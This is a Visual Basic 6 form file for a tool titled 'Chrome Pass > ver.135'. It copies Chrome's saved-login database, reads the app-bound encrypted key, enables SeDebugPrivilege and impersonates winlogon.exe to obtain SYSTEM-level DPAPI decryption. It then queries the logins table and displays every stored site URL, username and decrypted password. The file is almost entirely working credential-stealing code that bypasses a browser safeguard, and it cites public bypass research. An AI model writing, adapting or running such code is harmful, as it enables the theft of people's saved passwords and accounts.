VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "COMCTL32.OCX"
Begin VB.Form Form1 
   Caption         =   "Chrome Pass > ver.135"
   ClientHeight    =   7065
   ClientLeft      =   60
   ClientTop       =   465
   ClientWidth     =   11880
   LinkTopic       =   "Form1"
   ScaleHeight     =   7065
   ScaleWidth      =   11880
   StartUpPosition =   3  'Windows Default
   Begin ComctlLib.ListView ListWinlogon 
      Height          =   4215
      Left            =   6720
      TabIndex        =   4
      Top             =   120
      Width           =   5055
      _ExtentX        =   8916
      _ExtentY        =   7435
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   327682
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      NumItems        =   3
      BeginProperty ColumnHeader(1) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "Process"
         Object.Width           =   3246
      EndProperty
      BeginProperty ColumnHeader(2) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         SubItemIndex    =   1
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "PID"
         Object.Width           =   1764
      EndProperty
      BeginProperty ColumnHeader(3) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
         SubItemIndex    =   2
         Key             =   ""
         Object.Tag             =   ""
         Text            =   "winlogon"
         Object.Width           =   2293
      EndProperty
   End
   Begin VB.TextBox txtWinLogon 
      Appearance      =   0  'Flat
      Height          =   375
      Left            =   10440
      TabIndex        =   5
      Text            =   "0"
      Top             =   4440
      Width           =   1095
   End
   Begin VB.TextBox Text2 
      Height          =   1095
      Left            =   204
      MultiLine       =   -1  'True
      TabIndex        =   2
      Top             =   5040
      Width           =   11550
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Show Chrome Passwords"
      Height          =   495
      Left            =   4644
      TabIndex        =   1
      Top             =   6360
      Width           =   2175
   End
   Begin VB.TextBox Text1 
      Height          =   4455
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "Form1.frx":0000
      Top             =   120
      Width           =   6255
   End
   Begin VB.Label Label2 
      Caption         =   "WinLogon.exe Process ID for impersonating as SYSTEM:"
      Height          =   495
      Left            =   7920
      TabIndex        =   6
      Top             =   4440
      Width           =   2295
   End
   Begin VB.Label Label1 
      Caption         =   "app_bound_encrypted_key:"
      Height          =   270
      Left            =   195
      TabIndex        =   3
      Top             =   4800
      Width           =   6090
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' references:

'YouTube:
'https://www.youtube.com/watch?v=Op7poNLdi7c  (1m:31s - 12m:55s)

'Github:
'https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
'https://github.com/runassu/chrome_v20_decryption
'https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824




'SQL Database
Private m_DB_Chrome     As Long

'Unicode
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByRef lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
Private Const CP_UTF8      As Long = 65001



Private Sub Form_Load()

'Chromium Database Path
Dim Chromium_Database_Path As String 'Database Path = ..\Google\Chrome\User Data\Default\Login Data"
Dim FSO As New FileSystemObject

'Copy database just in case of being locked
Chromium_Database_Path = SpecialFolder(CSIDL_LOCAL_APPDATA) & "\Google\Chrome\User Data\Default\Login Data"
FSO.CopyFile Chromium_Database_Path, App.Path & "\db_temp.bak", True

'JSON file
Dim sRetFile As String
Dim p As Object

'**********************************************
'Parse app_bound_encrypted_key from Local State
'**********************************************
sRetFile = SpecialFolder(CSIDL_LOCAL_APPDATA) & "\Google\Chrome\User Data\Local State"
If FileExists(sRetFile) Then

    'READ .json file:
    Set p = JSON.parse(ReadTextFileUTF8(sRetFile))

    If Not (p Is Nothing) Then
        If JSON.GetParserErrors <> "" Then
            MsgBox JSON.GetParserErrors, vbInformation, "Parsing Error(s) occured"
        Else
            On Error GoTo Read_Key_Error:
            app_bound_encrypted_key = p.Item("os_crypt").Item("app_bound_encrypted_key")
            'MsgBox app_bound_encrypted_key, , "os_crypt: {app_bound_encrypted_key}"
        End If
    Else
Read_Key_Error:
    'app_bound_encrypted_key doesn't exist
    MsgBox "Error getting app_bound_encrypted_key"
    app_bound_encrypted_key = ""
    End If
Else
MsgBox "Can't find Local State file"
End If
    
    
    'app_bound_encrypted_key
    Text2.text = app_bound_encrypted_key
    
    
    
    'Chrome Version higher than v.80 but less than v.135
    'Get encrypted key from \\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    'Text2.text = "os_crypt":{"encrypted_key":"RFBBUEkBAAAA0Iyd3wEV...."}
       
    
End Sub

Private Sub Command1_Click()

        'Find "WinLogon.exe" ID for impersonating
        FindWinlogonEXE
        
        'AdjustTokenPrivileges = True
        ModifyState "SeDebugPrivilege", True

        If ImpersonateSelf Then 'SYSTEM DPAPI



                'Show Passwords *************************************
                Call ShowPasswords
                    
        
        
        End If
        
        
    
        If ImpersonateSelf Then
        '---------------------------------------------------
        ' Stop impersonating WinLogon.exe after decryption  |
        '---------------------------------------------------
        StopImpersonation
        End If
        
        'AdjustTokenPrivileges = False
        ModifyState "SeDebugPrivilege", False
    

End Sub


Private Sub ShowPasswords()

Text1.text = ""

    'Decrypt Chrome
    Call DecryptPasswordsChrome
           

End Sub

'-------------------------
' Decrypt Chrome Passwords
'-------------------------
Private Sub DecryptPasswordsChrome()

'Chrome Database Path
    Dim dPath As String 'Database Path
    'dPath = SpecialFolder(CSIDL_LOCAL_APPDATA) & "\Google\Chrome\User Data\Default\Login Data"
    dPath = App.Path & "\db_temp.bak" 'Backup database

'Exit if no database found
    'If FileExists(dPath) = False Then Exit Sub

'Decode Chrome Passwords
    Dim tBlobOut    As DATA_BLOB
    Dim tBlobIn     As DATA_BLOB
    Dim aData() As Byte

    Dim app_encrypted_key As String
    app_encrypted_key = Text2.text
    
    If Len(app_encrypted_key) Then
        'Dim sdecrypted_key As String
        'sdecrypted_key = Base64Decode(app_encrypted_key)
        
        Dim decrypted_app_key() As Byte
        'decrypted_app_key = DecodeBase64(app_encrypted_key)
        decrypted_app_key = Base64Decodeb(app_encrypted_key)

        Dim RetVal As Long
        With tBlobIn
            .cbData = UBound(decrypted_app_key) - LBound(decrypted_app_key) + 1 - 4 'Remove: len("APPB") text
            .pbData = VarPtr(decrypted_app_key(LBound(decrypted_app_key) + 4))
        End With
        RetVal = CryptUnprotectData(tBlobIn, 0&, 0&, 0&, 0&, 0, tBlobOut)

        If RetVal Then
        
            Dim amaster_key() As Byte
            amaster_key = ReadBlobArray(tBlobOut)
            'Dim master_key As String
            'master_key = ReadBlobString(tBlobOut)
            'MsgBox master_key
            'ADOUtil_Array amaster_key
            'MsgBox aData(0) & ";" & aData(1)
        
        End If
    End If
    
    'MsgBox RetVal
    If RetVal Then

        'Open database
        'If Chrome is running database might be locked -> CLOSE CHROME on testing or use .bak database
        ite_open dPath, m_DB_Chrome
        
        Dim sqlite3_stmt  As Long
        Dim hRet As Long
        
        hRet = ite_prepare(m_DB_Chrome, "SELECT origin_url, username_value, password_value FROM logins", sqlite3_stmt)
        
        If hRet = 0 Then
            
            Do While ite_next(sqlite3_stmt)

If Len(ite_column_text(sqlite3_stmt, 2)) > 0 Then
                
                aData() = ite_column_blob(sqlite3_stmt, 2)
                                                   
                    ' Fill the blob structure
                    'With tBlobIn
                    '   .cbData = UBound(aData) - LBound(aData) + 1
                    '   .pbData = VarPtr(aData(0))
                    'End With
                    
                    '' Fill the blob structure
                    'With tBlobIn
                    '   .cbData = UBound(aData) - LBound(aData) + 1 - 5 'len("DPAPI")
                    '   .pbData = VarPtr(aData(5))
                    'End With
                    
                        'first database column(0) = URL
                        'fourth column(3) = Username
                        'sixth column(5) = Password = aData()
                    
                        'Dim pwd As String
                        
                        'pwd = decrypt_password(aData, amaster_key)   '<---- Previous decoding function
                        'pwd = NewDecodePassword(aData, amaster_key)  '<---- NEW decoding Function
                        
                        Text1.text = Text1.text & _
                        "URL: " & ite_column_text(sqlite3_stmt, 0) & vbCrLf & _
                        "Username: " & ite_column_text(sqlite3_stmt, 1) & vbCrLf & _
                        "Password: " & NewDecodePassword(aData, amaster_key) & vbCrLf & vbCrLf

                        'Convert UTF password to Unicode with UTF8ToUnicode()
                        'MsgBox "Username: " & ite_column_text(sqlite3_stmt, 1) & vbCrLf & "Password: " & UTF8ToUnicode(NewDecodePassword(aData, amaster_key)), , "Username and Password:"
                                   
                
            
End If
                
                
            Loop
                                 
            
            
        End If
    
    End If
        
'finalize database
ite_finalize sqlite3_stmt

'Close database after decryption
ite_close m_DB_Chrome

End Sub



''PREVIOUS DECRYPTION CODE:
'-------------------------
'Private Function decrypt_password(aData() As Byte, amaster_key() As Byte) As String
'    Dim ret As Long
'    Dim iv() As Byte
'    Dim payload() As Byte
'    Dim tag(0 To 15) As Byte
'    Dim i As Integer
'    Dim text(2048) As Byte
'
'
'    'ADOUtil_Array aData
'
'    ReDim iv(0 To 11)
'    For i = 0 To 11
'        iv(i) = aData(LBound(aData) + 3 + i)
'    Next
'
'    'ADOUtil_Array iv
'
'    ReDim payload(0 To UBound(aData) - (LBound(aData) + 15) - 16 + 1)
'    For i = LBound(aData) + 15 To UBound(aData) - 16
'        payload(i - (LBound(aData) + 15)) = aData(i)
'    Next
'
'    For i = 0 To 15
'        tag(i) = aData(UBound(aData) - 15 + i)
'    Next
'
'    'ADOUtil_Array tag
'
'    'ADOUtil_Array payload
'
'    'ADOUtil_Array amaster_key
'
'    'ret = gcm_decrypt(VarPtr(payload(LBound(payload))), UBound(payload) - LBound(payload) + 1, VarPtr(tag(0)), 0, VarPtr(tag(LBound(tag))), VarPtr(amaster_key(LBound(amaster_key))), VarPtr(iv(LBound(iv))), UBound(iv) - LBound(iv) + 1, VarPtr(text(LBound(text))))
'    'ret = gcm_decrypt(VarPtr(payload(LBound(payload))), UBound(payload) - LBound(payload) + 1, 0&, 0, VarPtr(tag(LBound(tag))), VarPtr(amaster_key(LBound(amaster_key))), VarPtr(iv(LBound(iv))), UBound(iv) - LBound(iv) + 1, VarPtr(text(LBound(text))))
'    'ret = gcm_decrypt(VarPtr(payload(LBound(payload))), UBound(payload) - LBound(payload) + 1, 0&, 0, 0, VarPtr(amaster_key(LBound(amaster_key))), VarPtr(iv(LBound(iv))), UBound(iv) - LBound(iv) + 1, VarPtr(text(LBound(text))))
'    ret = gcm_decrypt(VarPtr(payload(LBound(payload))), UBound(payload) - LBound(payload) + 1, 0&, 0, VarPtr(tag(LBound(tag))), VarPtr(amaster_key(LBound(amaster_key))), VarPtr(iv(LBound(iv))), UBound(iv) - LBound(iv) + 1, VarPtr(text(LBound(text))))
'    'MsgBox "after: " & ret
'    'ADOUtil_Array text
'
'    decrypt_password = ""
'    For i = 1 To ret - 1
'        decrypt_password = decrypt_password & Chr$(text(LBound(text) + i - 1))
'    Next
'
'    'MsgBox "ret=" & ret & ", len=" & Len(decrypt_password)
'
'    'MsgBox decrypt_password
'
'End Function


Private Function ReadBlobString(ByRef tBlob As DATA_BLOB) As String
    Dim B       As Byte
    Dim i       As Long
    
    If tBlob.cbData = 0 Then Exit Function
    If tBlob.pbData = 0 Then Exit Function

    For i = 0 To tBlob.cbData - 1
        CopyMemory B, ByVal tBlob.pbData + i, 1
        ReadBlobString = ReadBlobString & Chr$(B)
    Next
    
    Call LocalFree(tBlob.pbData)
    
End Function


Private Function ReadBlobArray(ByRef tBlob As DATA_BLOB, Optional free As Boolean = True) As Byte()
    Static B()    As Byte
    Dim i       As Long
    
    If tBlob.cbData = 0 Then Exit Function
    If tBlob.pbData = 0 Then Exit Function

    ReDim B(0 To tBlob.cbData) '1 more for terminating 0
    CopyMemory B(0), ByVal tBlob.pbData, tBlob.cbData
    
    If free Then
        Call LocalFree(tBlob.pbData)
    End If
    
    ReadBlobArray = B
    
End Function






' Determines wheather or not a file already exists
Function FileExists(FileName As String) As Boolean
    On Error Resume Next
    Dim X As Long
    X = Len(Dir$(FileName))
    If Err Or X = 0 Then FileExists = False Else FileExists = True
End Function


Private Function UTF8ToUnicode(ByVal sUTF8 As String) As String
    Dim UTF8Size        As Long
    Dim BufferSize      As Long
    Dim BufferUNI       As String
    Dim LenUNI          As Long
    Dim bUTF8()         As Byte
    
    If LenB(sUTF8) = 0 Then Exit Function
    
    bUTF8 = StrConv(sUTF8, vbFromUnicode)
    UTF8Size = UBound(bUTF8) + 1
    
    BufferSize = UTF8Size * 2
    BufferUNI = String$(BufferSize, vbNullChar)
    
    LenUNI = MultiByteToWideChar(CP_UTF8, 0, bUTF8(0), UTF8Size, StrPtr(BufferUNI), BufferSize)
    
    If LenUNI Then UTF8ToUnicode = Left$(BufferUNI, LenUNI)

End Function



